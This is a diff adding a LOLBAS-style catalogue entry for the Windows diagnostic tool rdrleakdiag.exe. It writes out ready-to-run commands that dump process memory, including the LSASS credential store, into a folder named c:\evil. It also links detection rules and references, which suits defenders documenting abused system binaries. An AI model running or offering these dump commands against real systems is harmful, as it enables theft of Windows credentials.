@@ -1,0 +1,44 @@
+---
+Name: rdrleakdiag.exe
+Description: Microsoft Windows resource leak diagnostic tool
+Author: 'John Dwyer'
+Created: 2022-05-18
+Commands:
+  - Command: rdrleakdiag.exe /p 940 /o c:\evil /fullmemdmp /wait 1
+    Description: Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Usecase: Dump process by PID.
+    Category: Dump
+    Privileges: User
+    MitreID: T1003
+    OperatingSystem: Windows
+  - Command: rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1
+    Description: Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Usecase: Dump LSASS process.
+    Category: Dump
+    Privileges: Administrator
+    MitreID: T1003.001
+    OperatingSystem: Windows
+  - Command: rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /snap
+    Description: After dumping a process using /wait 1, subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).
+    Usecase: Dump LSASS process mutliple times.
+    Category: Dump
+    Privileges: Administrator
+    MitreID: T1003.001
+    OperatingSystem: Windows
+Full_Path:
+  - Path: c:\windows\system32\rdrleakdiag.exe
+  - Path: c:\Windows\SysWOW64\rdrleakdiag.exe
+Code_Sample:
+  - Code:
+Detection:
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_process_dump_rdrleakdiag.yml
+  - Elastic: https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html
+  - Elastic: https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml
+Resources:
+  - Link: https://twitter.com/0gtweet/status/1299071304805560321?s=21
+  - Link: https://www.pureid.io/dumping-abusing-windows-credentials-part-1/
+  - Link: https://github.com/LOLBAS-Project/LOLBAS/issues/84
+Acknowledgement:
+  - Person: Grzegorz Tworek
+    Handle: '@0gtweet'
+---
